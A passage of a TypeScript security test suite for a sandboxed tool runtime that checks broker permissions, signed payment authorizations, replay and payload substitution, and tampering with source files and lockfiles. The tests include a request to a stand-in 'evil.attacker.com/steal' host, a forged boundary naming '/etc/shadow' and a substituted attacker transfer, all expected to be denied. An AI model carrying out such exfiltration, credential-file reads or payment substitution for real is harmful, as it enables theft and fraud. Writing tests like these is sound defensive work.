          { path: path.join(tempWorkspace, "index.ts") },
          { invocationId: "unregistered_inv_manager", source: "worker" },
        ),
      ).rejects.toThrow(BrokerSecurityError);
    });

    it("Finding 9: ToolRuntime rejects broker operations when executed without verified qualification token", async () => {
      const runtime = new ToolRuntime({ allowUnsafeVmFallback: true, mode: "sandbox-vm" });
      const testManifest = {
        name: "test_unregistered_tool",
        version: "1.0.0",
        description: "Test tool",
        parameters: { type: "object", properties: {} },
      };

      const result = await runtime.executeTool(
        testManifest,
        async (ctx) => {
          return await ctx.broker.fs.readFile("index.ts");
        },
        {},
      );

      expect(result.status).toBe("error");
      expect(result.error?.message).toMatch(
        /rejected without a verified registered qualification boundary|No broker handler configured/,
      );
    });

    it("Finding 9: ToolRuntime allows broker operations within boundaries when executed with verified token", async () => {
      const readOnlyProfile: ObservedEffectProfile = {
        ...sampleObservedProfile,
        artifacts: { observation: "complete", items: [] },
      };
      const readOnlyToken = createVerifiedQualificationToken({
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        sourceDigest: "3333333333333333333333333333333333333333333333333333333333333333",
        depDigest: canonicalEmptyLockGraphDigest,
        schemaDigest: "efddc7bd8bbcef73a14eb1ace1ffdaec81e518ef1e13c1e9271d0b8acb694a49",
        intentDigest: "d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1",
        approval: sampleQualificationBundle.approval as unknown as ToolQualificationApproval,
        runs: [
          {
            ...sampleQualificationBundle.runs[0],
            observedEffects: readOnlyProfile,
          },
        ] as unknown as QualificationRunRecord[],
        effectProfile: readOnlyProfile,
        manifest: sampleQualificationBundle.manifest as unknown as ToolManifest,
        dependencies: {},
        rawBundle: sampleQualificationBundle as unknown as QualificationArtifactBundle,
      });

      const runtime = new ToolRuntime({
        allowUnsafeVmFallback: true,
        mode: "sandbox-vm",
        token: readOnlyToken,
        workspaceRoot: tempWorkspace,
      });

      const testManifest = {
        name: "tool_compiler",
        version: "1.0.0",
        description: "Compiler tool",
        parameters: { type: "object", properties: {} },
      };

      const result = await runtime.executeTool(
        testManifest,
        async (ctx) => {
          return await ctx.broker.fs.readFile(path.join(tempWorkspace, "index.ts"));
        },
        {},
      );

      expect(result.status).toBe("success");
      expect(result.output).toBeDefined();
    });

    it("Finding 8: routes consequential network request through authorization verifier and requires valid signature", async () => {
      const manager = new CapabilityBrokerManager({
        workspaceRoot: tempWorkspace,
        scratchDir: tempScratch,
        requireGrant: false,
        authorizationVerifier: sampleAuthVerifier,
      });

      const chargePayload = { amount: 5000, currency: "USD" };
      const chargePayloadDigest = computePayloadDigest(chargePayload);

      const validAuthRecord: ExternalActionAuthorizationRecord = {
        toolId: "payment_tool",
        toolVersion: "1.0.0",
        actionType: "charge",
        target: "https://api.payments.com/v1/charge",
        payloadDigest: chargePayloadDigest,
        approver: "finance_director_bob",
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
        keyId: trustedKeyId,
        signature: validSignature,
      };

      const invocationId = "inv_consequential_net_pass";
      manager.registerInvocation({
        invocationId,
        toolId: "payment_tool",
        boundaries: paymentVerifiedToken,
        externalAuthorizations: [validAuthRecord],
      });

      // 1. Consequential network request with matching authorization is permitted through net broker
      const effectCheck = manager.effectMonitor.checkBeforeEffect(invocationId, {
        type: "network_request",
        url: "https://api.payments.com/v1/charge",
        method: "POST",
        payload: chargePayload,
        authorization: validAuthRecord,
      });
      expect(effectCheck.allowed).toBe(true);

      // 2. Consequential network request with NO authorization record is denied
      const unauthInvocationId = "inv_consequential_net_deny";
      manager.registerInvocation({
        invocationId: unauthInvocationId,
        toolId: "payment_tool",
        boundaries: paymentVerifiedToken,
        // no externalAuthorizations
      });

      const unauthCheck = manager.effectMonitor.checkBeforeEffect(unauthInvocationId, {
        type: "network_request",
        url: "https://api.payments.com/v1/charge",
        method: "POST",
        payload: chargePayload,
      });
      expect(unauthCheck.allowed).toBe(false);
      expect(unauthCheck.violationType).toBe("external_action");
      expect(unauthCheck.reason).toContain("denied");
      expect(manager.effectMonitor.isInvocationRevoked(unauthInvocationId)).toBe(true);
    });

    it("Finding 8: enforces single-use authorization and prevents replay on consequential network actions", () => {
      const manager = new CapabilityBrokerManager({
        authorizationVerifier: sampleAuthVerifier,
      });

      const chargePayload = { amount: 2500, currency: "USD" };
      const chargePayloadDigest = computePayloadDigest(chargePayload);

      const singleUseAuth: ExternalActionAuthorizationRecord = {
        toolId: "payment_tool",
        toolVersion: "1.0.0",
        actionType: "charge",
        target: "https://api.payments.com/v1/charge",
        payloadDigest: chargePayloadDigest,
        approver: "finance_director_bob",
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
        keyId: trustedKeyId,
        signature: validSignature,
      };

      const invocationId = "inv_single_use_replay_test";
      manager.registerInvocation({
        invocationId,
        toolId: "payment_tool",
        boundaries: paymentVerifiedToken,
        externalAuthorizations: [singleUseAuth],
      });

      // First use succeeds
      const firstCheck = manager.effectMonitor.checkBeforeEffect(invocationId, {
        type: "network_request",
        url: "https://api.payments.com/v1/charge",
        method: "POST",
        payload: chargePayload,
        authorization: singleUseAuth,
      });
      expect(firstCheck.allowed).toBe(true);

      // Replay of the exact same authorization is rejected
      const replayCheck = manager.effectMonitor.checkBeforeEffect(invocationId, {
        type: "network_request",
        url: "https://api.payments.com/v1/charge",
        method: "POST",
        payload: chargePayload,
        authorization: singleUseAuth,
      });
      expect(replayCheck.allowed).toBe(false);
      expect(replayCheck.violationType).toBe("external_action");
      expect(replayCheck.reason).toContain("already been consumed");
    });

    it("Finding 8: rejects consequential network request where candidate authorization claims target A but effect targets B", () => {
      const profileWithConsequentialTargets: ObservedEffectProfile = {
        ...paymentProfile,
        consequentialActions: {
          observation: "complete",
          actions: [
            {
              actionType: "charge",
              target: "https://api.payments.com/v1/charge",
              description: "Primary charge",
              requiresExplicitAuthorization: true,
            },
            {
              actionType: "charge",
              target: "https://api.payments.com/v1/charge_secondary",
              description: "Secondary charge",
              requiresExplicitAuthorization: true,
            },
          ],
        },
      };

      const tokenWithConsequentialTargets = createVerifiedQualificationToken({
        toolId: "payment_tool",
        toolVersion: "1.0.0",
        sourceDigest: "3333333333333333333333333333333333333333333333333333333333333333",
        depDigest: canonicalEmptyLockGraphDigest,
        schemaDigest: "efddc7bd8bbcef73a14eb1ace1ffdaec81e518ef1e13c1e9271d0b8acb694a49",
        intentDigest: "d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1",
        approval: sampleQualificationBundle.approval as unknown as ToolQualificationApproval,
        runs: [
          {
            ...sampleQualificationBundle.runs[0],
            observedEffects: profileWithConsequentialTargets,
          },
        ] as unknown as QualificationRunRecord[],
        effectProfile: profileWithConsequentialTargets,
        manifest: sampleQualificationBundle.manifest as unknown as ToolManifest,
        dependencies: {},
        rawBundle: sampleQualificationBundle as unknown as QualificationArtifactBundle,
      });

      const manager = new CapabilityBrokerManager({
        authorizationVerifier: sampleAuthVerifier,
      });

      const chargePayload = { amount: 5000, currency: "USD" };
      const chargePayloadDigest = computePayloadDigest(chargePayload);

      // Authorization signed strictly for Target A: https://api.payments.com/v1/charge
      const authRecordForA: ExternalActionAuthorizationRecord = {
        toolId: "payment_tool",
        toolVersion: "1.0.0",
        actionType: "charge",
        target: "https://api.payments.com/v1/charge",
        payloadDigest: chargePayloadDigest,
        approver: "finance_director_bob",
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
        keyId: trustedKeyId,
        signature: validSignature,
      };

      const invocationId = "inv_mismatched_target_test";
      manager.registerInvocation({
        invocationId,
        toolId: "payment_tool",
        boundaries: tokenWithConsequentialTargets,
        externalAuthorizations: [authRecordForA],
      });

      // Effect attempts to send to a different target B: https://api.payments.com/v1/charge_secondary with the same payload
      const mismatchedTargetCheck = manager.effectMonitor.checkBeforeEffect(invocationId, {
        type: "network_request",
        url: "https://api.payments.com/v1/charge_secondary",
        method: "POST",
        payload: chargePayload,
        authorization: authRecordForA,
      });

      expect(mismatchedTargetCheck.allowed).toBe(false);
      expect(mismatchedTargetCheck.violationType).toBe("external_action");
      expect(manager.effectMonitor.isInvocationRevoked(invocationId)).toBe(true);
    });

    it("Finding 11: rejects payload substitution where attacker passes payload B with authorization for payload A", () => {
      const payloadA = { recipient: "alice", amount: 10 };
      const digestA = computePayloadDigest(payloadA);

      const payloadB = { recipient: "attacker", amount: 1000000 };
      const digestB = computePayloadDigest(payloadB);

      const signedRecordForA: ExternalActionAuthorizationRecord = {
        toolId: "payment_tool",
        toolVersion: "1.0.0",
        actionType: "transfer",
        target: "bank:transfer_endpoint",
        payloadDigest: digestA,
        approver: "security_officer_alice",
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
        keyId: trustedKeyId,
        signature: validSignature,
      };

      // Case 1: Attacker sends payload B with forged payloadDigest field claiming digestA
      const subValidation1 = validateExternalActionAuthorization(
        signedRecordForA,
        {
          toolId: "payment_tool",
          toolVersion: "1.0.0",
          actionType: "transfer",
          target: "bank:transfer_endpoint",
          payload: payloadB,
          payloadDigest: digestA,
        },
        { verifier: sampleAuthVerifier },
      );
      expect(subValidation1.valid).toBe(false);
      expect(subValidation1.reason).toContain("does not match computed payload digest");

      // Case 2: Attacker sends payload B without payloadDigest field
      const subValidation2 = validateExternalActionAuthorization(
        signedRecordForA,
        {
          toolId: "payment_tool",
          toolVersion: "1.0.0",
          actionType: "transfer",
          target: "bank:transfer_endpoint",
          payload: payloadB,
        },
        { verifier: sampleAuthVerifier },
      );
      expect(subValidation2.valid).toBe(false);
      expect(subValidation2.reason).toContain("does not match computed payload digest");

      // Case 3: Legitimate action with exact payload A succeeds
      const legitimateValidation = validateExternalActionAuthorization(
        signedRecordForA,
        {
          toolId: "payment_tool",
          toolVersion: "1.0.0",
          actionType: "transfer",
          target: "bank:transfer_endpoint",
          payload: payloadA,
          payloadDigest: digestA,
        },
        { verifier: sampleAuthVerifier },
      );
      expect(legitimateValidation.valid).toBe(true);
    });

    it("Ordinary in-profile network behavior: allows non-consequential requests without external authorization", () => {
      const monitor = new EffectMonitor();

      monitor.registerInvocation({
        invocationId: "inv_ordinary_net",
        toolId: "payment_tool",
        boundaries: paymentVerifiedToken,
      });

      // Destination api.github.com is in approved network destinations and NOT in consequentialActions
      const ordinaryCheck = monitor.checkBeforeEffect("inv_ordinary_net", {
        type: "network_request",
        url: "https://api.github.com/user",
        method: "GET",
      });
      expect(ordinaryCheck.allowed).toBe(true);
      expect(monitor.isInvocationRevoked("inv_ordinary_net")).toBe(false);

      // Destination not in approved network destinations is rejected
      const unapprovedCheck = monitor.checkBeforeEffect("inv_ordinary_net", {
        type: "network_request",
        url: "https://evil.attacker.com/steal",
        method: "GET",
      });
      expect(unapprovedCheck.allowed).toBe(false);
      expect(unapprovedCheck.violationType).toBe("network_access");
      expect(monitor.isInvocationRevoked("inv_ordinary_net")).toBe(true);
    });

    it("listDir alias in manager maps to file_read effect and enforces approved boundaries", async () => {
      const srcDir = path.join(tempWorkspace, "src");
      if (!fs.existsSync(srcDir)) fs.mkdirSync(srcDir, { recursive: true });

      const profileWithDir: ObservedEffectProfile = {
        ...sampleObservedProfile,
        filesRead: {
          observation: "complete",
          paths: ["index.ts", "package.json", "config.json", "src"],
        },
      };
      const tokenWithDir = createVerifiedQualificationToken({
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        sourceDigest: "3333333333333333333333333333333333333333333333333333333333333333",
        depDigest: "4444444444444444444444444444444444444444444444444444444444444444",
        schemaDigest: "c0b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90",
        intentDigest: "d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1",
        approval: sampleQualificationBundle.approval as unknown as ToolQualificationApproval,
        runs: [
          {
            ...sampleQualificationBundle.runs[0],
            observedEffects: profileWithDir,
          },
        ] as unknown as QualificationRunRecord[],
        effectProfile: profileWithDir,
        manifest: sampleQualificationBundle.manifest as unknown as ToolManifest,
        dependencies: {},
        rawBundle: sampleQualificationBundle as unknown as QualificationArtifactBundle,
      });

      const manager = new CapabilityBrokerManager({
        workspaceRoot: tempWorkspace,
        scratchDir: tempScratch,
        requireGrant: false,
      });

      const invocationId = "inv_listdir_test";
      manager.registerInvocation({
        invocationId,
        toolId: "tool_compiler",
        boundaries: tokenWithDir,
        workspaceRoot: tempWorkspace,
      });

      // Reading approved directory src via listDir succeeds
      const readRes = await manager.handleRequest(
        "fs",
        "listDir",
        { path: "src" },
        { invocationId, source: "worker", workspaceRoot: tempWorkspace },
      );
      expect(readRes).toBeDefined();

      // Reading unapproved directory via listDir is denied and quarantined
      await expect(
        manager.handleRequest(
          "fs",
          "listDir",
          { path: "unapproved_subdir" },
          { invocationId, source: "worker", workspaceRoot: tempWorkspace },
        ),
      ).rejects.toThrow(BrokerSecurityError);
      expect(manager.effectMonitor.isInvocationRevoked(invocationId)).toBe(true);
    });

    it("drift_detected immediately prohibits broker effects and fails checkResult", () => {
      let capturedQuarantine: QuarantineRecord | null = null;
      const monitor = new EffectMonitor({
        onQuarantine: (record) => {
          capturedQuarantine = record;
        },
      });

      const invocationId = "inv_drift_prohibition_test";
      monitor.registerInvocation({
        invocationId,
        toolId: "tool_compiler",
        boundaries: sampleVerifiedToken,
        actualSourceDigest: "8888888888888888888888888888888888888888888888888888888888888888",
      });

      expect(monitor.isInvocationRevoked(invocationId)).toBe(true);
      expect(capturedQuarantine).not.toBeNull();
      expect(capturedQuarantine?.violationType).toBe("source_drift");

      // Any broker call is immediately rejected
      const check = monitor.checkBeforeEffect(invocationId, {
        type: "file_read",
        path: "index.ts",
      });
      expect(check.allowed).toBe(false);
      expect(check.violationType).toBe("source_drift");
      expect(check.requiresRequalification).toBe(true);

      // Post-execution checkResult fails
      const result = monitor.checkResult(invocationId);
      expect(result.success).toBe(false);
      expect(result.requalificationRequired).toBe(true);
    });

    it("checkResult verifies exact signed artifacts and fails on mismatch/missing/extra artifacts", () => {
      const monitor = new EffectMonitor();

      // 1. Missing expected artifact dist/bundle.js
      monitor.registerInvocation({
        invocationId: "inv_art_missing",
        toolId: "tool_compiler",
        boundaries: sampleVerifiedToken,
      });
      const resMissing = monitor.checkResult("inv_art_missing", {
        artifacts: [],
      });
      expect(resMissing.success).toBe(false);
      expect(resMissing.violations?.[0]).toContain("Missing expected artifact");

      // 2. Digest mismatch
      monitor.registerInvocation({
        invocationId: "inv_art_mismatch",
        toolId: "tool_compiler",
        boundaries: sampleVerifiedToken,
      });
      const resMismatch = monitor.checkResult("inv_art_mismatch", {
        artifacts: [{ name: "dist/bundle.js", digest: "wrong_digest" }],
      });
      expect(resMismatch.success).toBe(false);
      expect(resMismatch.violations?.[0]).toContain("digest mismatch");

      // 3. Extra unexpected artifact
      monitor.registerInvocation({
        invocationId: "inv_art_extra",
        toolId: "tool_compiler",
        boundaries: sampleVerifiedToken,
      });
      const resExtra = monitor.checkResult("inv_art_extra", {
        artifacts: [
          {
            name: "dist/bundle.js",
            digest: "1111111111111111111111111111111111111111111111111111111111111111",
          },
          {
            name: "unexpected_malware.exe",
            digest: "2222222222222222222222222222222222222222222222222222222222222222",
          },
        ],
      });
      expect(resExtra.success).toBe(false);
      expect(resExtra.violations?.[0]).toContain("Unexpected extra artifact");
    });

    it("ToolRuntime propagates finalizeInvocation failures as invocation errors", async () => {
      const runtime = new ToolRuntime({
        allowUnsafeVmFallback: true,
        mode: "sandbox-vm",
        token: sampleVerifiedToken,
        workspaceRoot: tempWorkspace,
      });

      const testManifest = {
        name: "tool_compiler",
        version: "1.0.0",
        description: "Compiler tool",
        parameters: { type: "object", properties: {} },
      };

      // When tool executes with no actual artifacts produced, finalizeInvocation fails on missing signed artifact
      const result = await runtime.executeTool(
        testManifest,
        async () => {
          return { result: "finished" };
        },
        {},
      );

      expect(result.status).toBe("error");
      expect(result.error?.type).toBe("boundary_violation");
      expect(result.error?.message).toContain("Missing expected artifact");
    });

    it("rejects fabricated raw defaultBoundaries in EffectMonitor constructor without token", () => {
      const fabricatedRaw = {
        filesRead: { observation: "complete" as const, paths: new Set(["/etc/shadow"]) },
      };

      expect(() => {
        new EffectMonitor({
          defaultBoundaries: fabricatedRaw as unknown as VerifiedQualificationToken,
        });
      }).toThrow(BrokerSecurityError);

      expect(() => {
        new CapabilityBrokerManager({
          defaultBoundaries: fabricatedRaw as unknown as VerifiedQualificationToken,
        });
      }).toThrow(BrokerSecurityError);
    });

    it("EffectMonitor with default strict=true immediately fails closed for unregistered invocations", async () => {
      const monitor = new EffectMonitor(); // default strict=true

      const check = monitor.checkBeforeEffect("unregistered_direct_inv", {
        type: "file_read",
        path: "index.ts",
      });

      expect(check.allowed).toBe(false);
      expect(check.violationType).toBe("policy_violation");
      expect(check.reason).toContain("Unregistered invocation");

      const bareManager = new CapabilityBrokerManager({
        workspaceRoot: tempWorkspace,
        requireGrant: false,
      });
      // Bare manager with default strict=true rejects unregistered fs, net, and cmd effects
      await expect(
        bareManager.handleRequest(
          "fs",
          "readFile",
          { path: "index.ts" },
          { invocationId: "unregistered_bare_fs", source: "worker" },
        ),
      ).rejects.toThrow(BrokerSecurityError);

      await expect(
        bareManager.handleRequest(
          "net",
          "fetch",
          { url: "https://api.github.com" },
          { invocationId: "unregistered_bare_net", source: "worker" },
        ),
      ).rejects.toThrow(BrokerSecurityError);

      await expect(
        bareManager.handleRequest(
          "cmd",
          "execute",
          { command: "node", args: ["index.ts"] },
          { invocationId: "unregistered_bare_cmd", source: "worker" },
        ),
      ).rejects.toThrow(BrokerSecurityError);
    });

    it("registerInvocation rejects toolId or toolVersion mismatch against verified token", () => {
      const monitor = new EffectMonitor();

      expect(() => {
        monitor.registerInvocation({
          invocationId: "inv_mismatched_tool_id",
          toolId: "malicious_tool_b",
          boundaries: sampleVerifiedToken, // toolId is "tool_compiler"
        });
      }).toThrow(BrokerSecurityError);

      expect(() => {
        monitor.registerInvocation({
          invocationId: "inv_mismatched_tool_version",
          toolId: "tool_compiler",
          toolVersion: "2.0.0", // token version is "1.0.0"
          boundaries: sampleVerifiedToken,
        });
      }).toThrow(BrokerSecurityError);
    });

    it("ToolRuntime rejects token-A with manifest-B (confused-deputy identity mismatch)", async () => {
      const runtime = new ToolRuntime({ allowUnsafeVmFallback: true, mode: "sandbox-vm" });
      const maliciousManifestB = {
        name: "malicious_stealth_tool",
        version: "1.0.0",
        description: "Stealth tool trying to hijack compiler token",
        parameters: { type: "object", properties: {} },
      };

      await expect(
        runtime.executeTool(
          maliciousManifestB,
          "export default () => ({ leaked: true })",
          {},
          { token: sampleVerifiedToken },
        ),
      ).rejects.toThrow(/Tool identity mismatch/);
    });

    it("ToolRuntime rejects token-A with entrypoint-B (source code digest mismatch)", async () => {
      const runtime = new ToolRuntime({ allowUnsafeVmFallback: true, mode: "sandbox-vm" });
      const matchingManifest = {
        name: "tool_compiler",
        version: "1.0.0",
        description: "Compiler tool",
        parameters: { type: "object", properties: {} },
      };

      await expect(
        runtime.executeTool(
          matchingManifest,
          "export default () => ({ maliciousPayload: true })", // altered source code
          {},
          { token: sampleVerifiedToken },
        ),
      ).rejects.toThrow(/Source code digest mismatch/);
    });

    it("ToolRuntime rejects execution when entrypoint file is mutated after token creation (TOCTOU defense)", async () => {
      const runtime = new ToolRuntime({ allowUnsafeVmFallback: true, mode: "sandbox-vm" });
      const toolDir = fs.mkdtempSync(path.join(os.tmpdir(), "toctou_tool_"));
      const entrypointFile = path.join(toolDir, "index.js");

      // Original approved source code
      const approvedSource = "export default () => ({ clean: true });";
      fs.writeFileSync(entrypointFile, approvedSource);

      const approvedSourceDigest = computePayloadDigest(approvedSource);

      const approvedToken = createVerifiedQualificationToken({
        toolId: "dynamic_tool",
        toolVersion: "1.0.0",
        sourceDigest: approvedSourceDigest,
        depDigest: "4444444444444444444444444444444444444444444444444444444444444444",
        schemaDigest: "efddc7bd8bbcef73a14eb1ace1ffdaec81e518ef1e13c1e9271d0b8acb694a49",
        intentDigest: "d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1",
        approval: sampleQualificationBundle.approval as unknown as ToolQualificationApproval,
        runs: [] as unknown as QualificationRunRecord[],
        effectProfile: {
          ...sampleObservedProfile,
          artifacts: { observation: "complete", items: [] },
        },
        manifest: { name: "dynamic_tool", version: "1.0.0" } as unknown as ToolManifest,
        dependencies: {},
        rawBundle: sampleQualificationBundle as unknown as QualificationArtifactBundle,
      });

      const manifest = {
        name: "dynamic_tool",
        version: "1.0.0",
        description: "Dynamic tool",
        parameters: { type: "object", properties: {} },
      };

      // Mutate entrypoint on disk before execution
      fs.writeFileSync(entrypointFile, "export default () => ({ hijacked: true });");

      try {
        await expect(
          runtime.executeTool(manifest, entrypointFile, {}, { token: approvedToken }),
        ).rejects.toThrow(/Source code digest mismatch/);
      } finally {
        fs.rmSync(toolDir, { recursive: true, force: true });
      }
    });

    it("ToolRuntime rejects execution when package.json dependencies are mutated after token creation (TOCTOU dependency defense)", async () => {
      const runtime = new ToolRuntime({ allowUnsafeVmFallback: true, mode: "sandbox-vm" });
      const toolDir = fs.mkdtempSync(path.join(os.tmpdir(), "toctou_pkg_tool_"));
      const entrypointFile = path.join(toolDir, "index.js");
      const pkgFile = path.join(toolDir, "package.json");
      const lockFile = path.join(toolDir, "package-lock.json");

      const approvedSource = "export default () => ({ clean: true });";
      fs.writeFileSync(entrypointFile, approvedSource);
      const approvedSourceDigest = computePayloadDigest(approvedSource);

      const approvedPkg = {
        name: "pkg_tool",
        version: "1.0.0",
        dependencies: { lodash: "^4.17.21" },
      };
      const approvedLock = {
        name: "pkg_tool",
        version: "1.0.0",
        lockfileVersion: 3,
        packages: { "": approvedPkg },
      };
      fs.writeFileSync(pkgFile, JSON.stringify(approvedPkg));
      fs.writeFileSync(lockFile, JSON.stringify(approvedLock));

      const lockGraph = { package: approvedPkg, lock: approvedLock };
      const approvedLockGraphDigest = computePayloadDigest(lockGraph);

      const approvedToken = createVerifiedQualificationToken({
        toolId: "pkg_tool",
        toolVersion: "1.0.0",
        sourceDigest: approvedSourceDigest,
        depDigest: approvedLockGraphDigest,
        schemaDigest: "efddc7bd8bbcef73a14eb1ace1ffdaec81e518ef1e13c1e9271d0b8acb694a49",
        intentDigest: "d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1",
        approval: sampleQualificationBundle.approval as unknown as ToolQualificationApproval,
        runs: [] as unknown as QualificationRunRecord[],
        effectProfile: {
          ...sampleObservedProfile,
          artifacts: { observation: "complete", items: [] },
        },
        manifest: { name: "pkg_tool", version: "1.0.0" } as unknown as ToolManifest,
        dependencies: approvedPkg.dependencies,
        rawBundle: sampleQualificationBundle as unknown as QualificationArtifactBundle,
      });

      const manifest = {
        name: "pkg_tool",
        version: "1.0.0",
        description: "Pkg tool",
        parameters: { type: "object", properties: {} },
      };

      // Mutate package.json dependencies on disk before execution
      fs.writeFileSync(
        pkgFile,
        JSON.stringify({
          name: "pkg_tool",
          version: "1.0.0",
          dependencies: { lodash: "^4.17.21", malicious_pkg: "1.0.0" },
        }),
      );

      try {
        await expect(
          runtime.executeTool(manifest, toolDir, {}, { token: approvedToken }),
        ).rejects.toThrow(/package-lock graph digest mismatch/);
      } finally {
        fs.rmSync(toolDir, { recursive: true, force: true });
      }
    });

    it("ToolRuntime rejects execution when package-lock.json is missing for bundle with package.json", async () => {
      const runtime = new ToolRuntime({ allowUnsafeVmFallback: true, mode: "sandbox-vm" });
      const toolDir = fs.mkdtempSync(path.join(os.tmpdir(), "missing_lock_tool_"));
      const entrypointFile = path.join(toolDir, "index.js");
      const pkgFile = path.join(toolDir, "package.json");

      const approvedSource = "export default () => ({ clean: true });";
      fs.writeFileSync(entrypointFile, approvedSource);
      const approvedSourceDigest = computePayloadDigest(approvedSource);

      const approvedPkg = {
        name: "missing_lock_tool",
        version: "1.0.0",
        dependencies: { lodash: "^4.17.21" },
      };
      fs.writeFileSync(pkgFile, JSON.stringify(approvedPkg));

      const approvedToken = createVerifiedQualificationToken({
        toolId: "missing_lock_tool",
        toolVersion: "1.0.0",
        sourceDigest: approvedSourceDigest,
        depDigest: "4444444444444444444444444444444444444444444444444444444444444444",
        schemaDigest: "efddc7bd8bbcef73a14eb1ace1ffdaec81e518ef1e13c1e9271d0b8acb694a49",
        intentDigest: "d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1",
        approval: sampleQualificationBundle.approval as unknown as ToolQualificationApproval,
        runs: [] as unknown as QualificationRunRecord[],
        effectProfile: {
          ...sampleObservedProfile,
          artifacts: { observation: "complete", items: [] },
        },
        manifest: { name: "missing_lock_tool", version: "1.0.0" } as unknown as ToolManifest,
        dependencies: approvedPkg.dependencies,
        rawBundle: sampleQualificationBundle as unknown as QualificationArtifactBundle,
      });

      const manifest = {
        name: "missing_lock_tool",
        version: "1.0.0",
        description: "Missing lock tool",
        parameters: { type: "object", properties: {} },
      };

      try {
        await expect(
          runtime.executeTool(manifest, toolDir, {}, { token: approvedToken }),
        ).rejects.toThrow(/missing required package-lock\.json/);
      } finally {
        fs.rmSync(toolDir, { recursive: true, force: true });
      }
    });

    it("ToolRuntime rejects execution when package-lock.json lock graph is mutated after token creation", async () => {
      const runtime = new ToolRuntime({ allowUnsafeVmFallback: true, mode: "sandbox-vm" });
      const toolDir = fs.mkdtempSync(path.join(os.tmpdir(), "toctou_lock_tool_"));
      const entrypointFile = path.join(toolDir, "index.js");
      const pkgFile = path.join(toolDir, "package.json");
      const lockFile = path.join(toolDir, "package-lock.json");

      const approvedSource = "export default () => ({ clean: true });";
      fs.writeFileSync(entrypointFile, approvedSource);
      const approvedSourceDigest = computePayloadDigest(approvedSource);

      const pkgObj = { name: "lock_tool", version: "1.0.0", dependencies: { lodash: "^4.17.21" } };
      const lockObj = {
        name: "lock_tool",
        version: "1.0.0",
        lockfileVersion: 3,
        packages: {
          "": pkgObj,
          "node_modules/lodash": {
            version: "4.17.21",
            resolved: "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
            integrity:
              "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg==",
          },
        },
      };

      fs.writeFileSync(pkgFile, JSON.stringify(pkgObj));
      fs.writeFileSync(lockFile, JSON.stringify(lockObj));

      const lockGraph = { package: pkgObj, lock: lockObj };
      const approvedLockGraphDigest = computePayloadDigest(lockGraph);

      const approvedToken = createVerifiedQualificationToken({
        toolId: "lock_tool",
        toolVersion: "1.0.0",
        sourceDigest: approvedSourceDigest,
        depDigest: approvedLockGraphDigest,
        schemaDigest: "efddc7bd8bbcef73a14eb1ace1ffdaec81e518ef1e13c1e9271d0b8acb694a49",
        intentDigest: "d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1",
        approval: sampleQualificationBundle.approval as unknown as ToolQualificationApproval,
        runs: [] as unknown as QualificationRunRecord[],
        effectProfile: {
          ...sampleObservedProfile,
          artifacts: { observation: "complete", items: [] },
        },
        manifest: { name: "lock_tool", version: "1.0.0" } as unknown as ToolManifest,
        dependencies: pkgObj.dependencies,
        rawBundle: sampleQualificationBundle as unknown as QualificationArtifactBundle,
      });

      const manifest = {
        name: "lock_tool",
        version: "1.0.0",
        description: "Lock tool",
        parameters: { type: "object", properties: {} },
      };

      // Mutate package-lock.json (e.g. tampered dependency integrity/version) on disk before execution
      const tamperedLock = {
        ...lockObj,
        packages: {
          ...lockObj.packages,
          "node_modules/lodash": {
            ...lockObj.packages["node_modules/lodash"],
            integrity: "sha512-tampered_malicious_integrity_hash==",
          },
        },
      };
      fs.writeFileSync(lockFile, JSON.stringify(tamperedLock));

      try {
        await expect(
          runtime.executeTool(manifest, toolDir, {}, { token: approvedToken }),
        ).rejects.toThrow(/package-lock graph digest mismatch/);
      } finally {
        fs.rmSync(toolDir, { recursive: true, force: true });
      }
    });

    it("rejects registration and execution when external authorizations are present without a verified qualification token", async () => {
      const manager = new CapabilityBrokerManager({
        authorizationVerifier: sampleAuthVerifier,
      });

      const chargePayload = { amount: 1000, currency: "USD" };
      const chargePayloadDigest = computePayloadDigest(chargePayload);

      const validAuthRecord: ExternalActionAuthorizationRecord = {
        toolId: "unqualified_tool",
        toolVersion: "1.0.0",
        actionType: "charge",
        target: "https://api.payments.com/v1/charge",
        payloadDigest: chargePayloadDigest,
        approver: "finance_director_bob",
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
        keyId: trustedKeyId,
        signature: validSignature,
      };

      // 1. Direct manager registration with externalAuthorizations but NO token is rejected in production
      expect(() => {
        manager.registerInvocation({
          invocationId: "inv_auth_no_token",
          toolId: "unqualified_tool",
          externalAuthorizations: [validAuthRecord],
        });
      }).toThrow(BrokerSecurityError);

      // 2. ToolRuntime with valid external authorization but NO token is rejected / fails closed
      const runtime = new ToolRuntime({ allowUnsafeVmFallback: true, mode: "sandbox-vm" });
      const manifest = {
        name: "unqualified_tool",
        version: "1.0.0",
        description: "Unqualified tool",
        parameters: { type: "object", properties: {} },
      };

      const result = await runtime.executeTool(
        manifest,
        async (ctx) => {
          return await ctx.broker.fs.readFile("index.ts");
        },
        {},
        { externalAuthorizations: [validAuthRecord], authorizationVerifier: sampleAuthVerifier },
      );

      expect(result.status).toBe("error");
      expect(result.error?.message).toMatch(
        /rejected without a verified registered qualification boundary|No broker handler configured|verified qualification token is required/,
